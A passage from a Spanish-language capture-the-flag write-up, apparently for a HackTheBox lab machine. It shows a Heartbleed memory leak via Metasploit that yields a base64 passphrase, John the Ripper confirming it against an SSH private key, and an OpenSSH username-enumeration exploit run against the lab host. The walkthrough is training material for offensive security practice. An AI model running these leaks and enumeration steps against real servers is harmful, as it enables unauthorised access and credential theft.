+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....</span>$text<span style="color:#e6db74">=aGVhc
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D DC  mV0aGVoeXBlCg==.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0160: ED 31 5B 67 F5 75 B8 0D 1E 81 12 F4 5D 82 43 29  .1[g.u......].C)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0170: 26 C9 B8 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  &amp;...............
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0180: 2E 31 2E 30 35 31 36 30 3C 2F 76 65 72 73 69 6F  .1.05160&lt;/versio
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0190: 6E 3E 0A 3C 64 65 76 69 63 65 2D 69 64 20 64 65  n&gt;.&lt;device-id de
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  01a0: 76 69 63 65 2D 74 79 70 65 3D 22 4D 61 63 42 6F  vice-type=&#34;</span>MacBo
+</span></span><span style="display:flex;"><span>  01b0: 6F 6B <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">34</span> 2C <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">70</span> 6C <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">66</span> 6F  okAir4,1<span style="color:#e6db74">&#34; platfo
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  01c0: 72 6D 2D 76 65 72 73 69 6F 6E 3D 22 31 30 2E 39  rm-version=&#34;</span>10.9
+</span></span><span style="display:flex;"><span>  01d0: 2E <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">75</span> 6E <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">65</span> 2D <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">64</span> 3D <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">34</span>  .2<span style="color:#e6db74">&#34; unique-id=&#34;</span><span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  01e0: <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">45</span>  70E514A5FF3955FE
+</span></span><span style="display:flex;"><span>  01f0: <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span>  D15BDF10113B9800
+</span></span><span style="display:flex;"><span>  0200: <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">36</span>  8E5920F102B68B46
+</span></span><span style="display:flex;"><span>  0210: <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">30</span>  CA1A92BA3E6C76C0
+</span></span><span style="display:flex;"><span>  0220: <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">44</span>  52A839A4C5A40FAD
+</span></span><span style="display:flex;"><span>  0230: <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">30</span>  9C73E2E214E9BB90
+</span></span><span style="display:flex;"><span>  0240: <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">39</span>  E392D36981E90969
+</span></span><span style="display:flex;"><span>  0250: <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">22</span>  5DD40B6205BB04C<span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0260: 3E 6D 61 63 2D 69 6E 74 65 6C 3C 2F 64 65 76 69  &gt;mac-intel&lt;/devi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0270: 63 65 2D 69 64 3E 0A 3C 6D 61 63 2D 61 64 64 72  ce-id&gt;.&lt;mac-addr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0280: 65 73 73 2D 6C 69 73 74 3E 0A 3C 6D 61 63 2D 61  ess-list&gt;.&lt;mac-a
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0290: 64 64 72 65 73 73 3E 36 37 63 36 65 34 34 39 37  ddress&gt;67c6e4497
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  02a0: 63 39 38 3C 2F 6D 61 63 2D 61 64 64 72 65 73 73  c98&lt;/mac-address
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  02b0: 3E 3C 2F 6D 61 63 2D 61 64 64 72 65 73 73 2D 6C  &gt;&lt;/mac-address-l
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  02c0: 69 73 74 3E 0A 3C 67 72 6F 75 70 2D 73 65 6C 65  ist&gt;.&lt;group-sele
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  02d0: 63 74 3E 56 50 4E 3C 2F 67 72 6F 75 70 2D 73 65  ct&gt;VPN&lt;/group-se
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  02e0: 6C 65 63 74 3E 0A 3C 67 72 6F 75 70 2D 61 63 63  lect&gt;.&lt;group-acc
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  02f0: 65 73 73 3E 68 74 74 70 73 3A 2F 2F 31 30 2E 31  ess&gt;https://10.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0300: 30 2E 31 30 2E 37 39 3A 34 34 33 3C 2F 67 72 6F  0.10.79:443&lt;/gro
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0310: 75 70 2D 61 63 63 65 73 73 3E 0A 3C 2F 63 6F 6E  up-access&gt;.&lt;/con
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0320: 66 69 67 2D 61 75 74 68 3E 77 3F A7 F5 07 8F 0C  fig-auth&gt;w?.....
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0330: E1 1B 6C 72 CC 6C 79 97 8E D9 7B 79 87 02 02 02  ..lr.ly...{y....
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  1f60: 71 D4 00 00 00 00 00 00 00 00 00 00 00 00 00 00  q...............
+</span></span></span></code></pre></div><p>Veo dos cosillas que nos pueden servir, una es esta que es una variable con data en <strong>base64</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0130: <span style="color:#ae81ff">32</span> 0D 0A 0D 0A <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">74</span> 3D <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">47</span> <span style="color:#ae81ff">56</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">63</span>  2....$text<span style="color:#f92672">=</span>aGVhc
+</span></span><span style="display:flex;"><span>  0140: 6E <span style="color:#ae81ff">52</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">47</span> <span style="color:#ae81ff">56</span> 6C 5A <span style="color:#ae81ff">47</span> 4A 6C <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">47</span> 6C 6C <span style="color:#ae81ff">64</span>  nRibGVlZGJlbGlld
+</span></span><span style="display:flex;"><span>  0150: 6D <span style="color:#ae81ff">56</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">47</span> <span style="color:#ae81ff">56</span> 6F <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">42</span> 6C <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">67</span> 3D 3D DC  mV0aGVoeXBlCg<span style="color:#f92672">==</span>.
+</span></span></code></pre></div><p>Y la otra es esta:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unique-id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  01e0: 37 30 45 35 31 34 41 35 46 46 33 39 35 35 46 45  70E514A5FF3955FE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  01f0: 44 31 35 42 44 46 31 30 31 31 33 42 39 38 30 30  D15BDF10113B9800
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0200: 38 45 35 39 32 30 46 31 30 32 42 36 38 42 34 36  8E5920F102B68B46
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0210: 43 41 31 41 39 32 42 41 33 45 36 43 37 36 43 30  CA1A92BA3E6C76C0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0220: 35 32 41 38 33 39 41 34 43 35 41 34 30 46 41 44  52A839A4C5A40FAD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0230: 39 43 37 33 45 32 45 32 31 34 45 39 42 42 39 30  9C73E2E214E9BB90
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0240: 45 33 39 32 44 33 36 39 38 31 45 39 30 39 36 39  E392D36981E90969
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0250: 35 44 44 34 30 42 36 32 30 35 42 42 30 34 43 22  5DD40B6205BB04C&#34;</span>
+</span></span></code></pre></div><p>El problema es que no identifico en que está encodeado la variable <strong>unique-id</strong>, entonces la voy a descartar de momento.</p>
+<p>Además, nos indica una <strong>MAC</strong> de, al parecer, un dispositivo <strong>Apple</strong>, qué raro, bien veamos si podemos descifrar la variable <strong>text</strong>.</p>
+<h3 id="Metas">Usando Módulo Auxiliar de Metasploit para Explotar Heartbleed</h3>
+<p>Dentro de <strong>Metasploit</strong> tenemos un módulo que podemos usar para identificar la vulnerabilidad <strong>Heartbleed</strong> y dumpear la memoria del servidor al mismo tiempo.</p>
+<p>Vamos a sacarlo por pasos.</p>
+<ul>
+<li>Inicia <strong>Metasploit</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole
+</span></span></code></pre></div><ul>
+<li>Busca y usa el módulo de escaneo de <strong>Heartbleed</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; search heartbleed
+</span></span><span style="display:flex;"><span>-
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                              Disclosure Date  Rank    Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                              ---------------  ----    -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat <span style="color:#f92672">(</span>Heartbleed<span style="color:#f92672">)</span> Client Memory Exposure
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat <span style="color:#f92672">(</span>Heartbleed<span style="color:#f92672">)</span> Information Leak
+</span></span><span style="display:flex;"><span>-
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 1, use <span style="color:#ae81ff">1</span> or use auxiliary/scanner/ssl/openssl_heartbleed
+</span></span><span style="display:flex;"><span>-
+</span></span><span style="display:flex;"><span>msf6 &gt; use <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/ssl/openssl_heartbleed<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><ul>
+<li>Configura el módulo:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/ssl/openssl_heartbleed<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.10.79
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.10.79
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/ssl/openssl_heartbleed<span style="color:#f92672">)</span> &gt; set VERBOSE true
+</span></span><span style="display:flex;"><span>VERBOSE <span style="color:#f92672">=</span>&gt; true
+</span></span></code></pre></div><ul>
+<li>Activalo:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/ssl/openssl_heartbleed<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.79:443       - Leaking heartbeat response <span style="color:#75715e">#1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.79:443       - Sending Client Hello...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.79:443       - SSL record <span style="color:#75715e">#1:</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.79:443       -     Type:    <span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.79:443       -     Version: 0x0301
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.79:443       -     Length:  <span style="color:#ae81ff">86</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.79:443       -     Handshake <span style="color:#75715e">#1:</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.79:443       -             Length: <span style="color:#ae81ff">82</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>La respuesta es mucho más larga, pero podemos ver la data en <strong>base64</strong> que ya habiamos obtenido antes.</p>
+<h3 id="Base64">Descifrando Data en Base64 y Hash</h3>
+<p>Vamos a copiar solamente la data de <strong>base64</strong> en un archivo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano text
+</span></span><span style="display:flex;"><span>cat text      
+</span></span><span style="display:flex;"><span>aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg<span style="color:#f92672">==</span>
+</span></span></code></pre></div><p>Y ahora, usemos el comando <strong>base64</strong> para ver si puede descifrar que es esta data:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat text| base64 -d
+</span></span><span style="display:flex;"><span>heartbleedbelievethehype
+</span></span></code></pre></div><p>Mmmmmm a mi parecer esto es una contraseña. ¿Será que es la contraseña para desencriptar la llave privada?, o ¿es la contraseña de un usuario?</p>
+<p>Como no tenemos un usuario todavia, vamos a probar si es la contraseña para la llave privada.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w<span style="color:#f92672">=</span>diccionario.txt hash                 
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH, SSH private key <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>KDF/cipher <span style="color:#f92672">[</span>0<span style="color:#f92672">=</span>MD5/AES 1<span style="color:#f92672">=</span>MD5/3DES 2<span style="color:#f92672">=</span>Bcrypt/AES<span style="color:#f92672">])</span> is <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>heartbleedbelievethehype <span style="color:#f92672">(</span>id_rsa<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2023-04-21 15:06<span style="color:#f92672">)</span> 16.66g/s 16.66p/s 16.66c/s 16.66C/s heartbleedbelievethehype
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Pefecto si es, ya tenemos una contraseña para el <strong>SSH</strong>, pero nos falta un usuario.</p>
+<p>Vamos a hacer lo que hicimos en la <strong>máquina Nibbles</strong>, a probar con todo.</p>
+<h3 id="Usuario">Buscando un Usuario Valido para Servicio SSH</h3>
+<p>Lo que vamos a probar como usuarios, serán los siguientes:</p>
+<ul>
+<li><em>valentine</em></li>
+<li><em>heart</em></li>
+<li><em>bleed</em></li>
+<li><em>heartbleed</em></li>
+<li><em>believe</em></li>
+<li><em>hype</em></li>
+</ul>
+<p>Para probarlos, vamos a usar un Exploit que ya utilizamos una vez en la <strong>máquina Blocky</strong>, busquémoslo con <strong>Searchsploit</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit ssh enum    
+</span></span><span style="display:flex;"><span>----------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                       |  Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                             | linux/remote/45233.py
+</span></span><span style="display:flex;"><span>OpenSSH 2.3 &lt; 7.7 - Username Enumeration <span style="color:#f92672">(</span>PoC<span style="color:#f92672">)</span>                                                       | linux/remote/45210.py
+</span></span><span style="display:flex;"><span>OpenSSH 7.2p2 - Username Enumeration                                                                 | linux/remote/40136.py
+</span></span><span style="display:flex;"><span>OpenSSH &lt; 7.7 - User Enumeration <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                 | linux/remote/45939.py
+</span></span><span style="display:flex;"><span>OpenSSHd 7.2p2 - Username Enumeration                                                                | linux/remote/40113.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>Papers: No Results
+</span></span></code></pre></div><p>Copiemos el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -m linux/remote/45939.py
+</span></span><span style="display:flex;"><span>  Exploit: OpenSSH &lt; 7.7 - User Enumeration <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/45939
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
+</span></span><span style="display:flex;"><span>    Codes: CVE-2018-15473
+</span></span><span style="display:flex;"><span> Verified: False
+</span></span><span style="display:flex;"><span>File Type: Python script, ASCII text executable
+</span></span></code></pre></div><p>Y ahora sí, probemos los usuarios que tenemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 SSH_Exploit.py 10.10.10.79 valentine 2&gt;/dev/null                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> valentine is an invalid username
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python2 SSH_Exploit.py 10.10.10.79 heart 2&gt;/dev/null
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> heart is an invalid username
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python2 SSH_Exploit.py 10.10.10.79 bleed 2&gt;/dev/null
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> bleed is an invalid username
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python2 SSH_Exploit.py 10.10.10.79 heartbleed 2&gt;/dev/null
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> heartbleed is an invalid username
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python2 SSH_Exploit.py 10.10.10.79 hype 2&gt;/dev/null
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> hype is a valid username
+</span></span></code></pre></div><p>¡Encontramos uno! Vamos a probar si podemos entrar al servicio <strong>SSH</strong> con ese usuario, con la llave privada <strong>id_rsa</strong> y con la contraseña <strong>heartbleedbelievethehype</strong>.</p>
+<hr>
+<p><strong>IMPORTANTE</strong></p>
+<p>No podía entrar al servicio <strong>SSH</strong> porque al parecer, necesitas hacer un archivo con unas líneas de código para que el <strong>SSH</strong> acepte llaves tipo <strong>rsa</strong>, aquí lo explican mejor que yo:</p>
+<ul>
+<li><a href="https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported" target="_blank">Sign_and_send_pubkey: no mutual signature supported</a></li>
+</ul>
+<p>Entonces crea el archivo <strong>config</strong> y añade las 2 líneas de código que mencionan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano ~/.ssh/config
+</span></span><span style="display:flex;"><span>Host *
+</span></span><span style="display:flex;"><span>    PubkeyAcceptedKeyTypes<span style="color:#f92672">=</span>+ssh-rsa
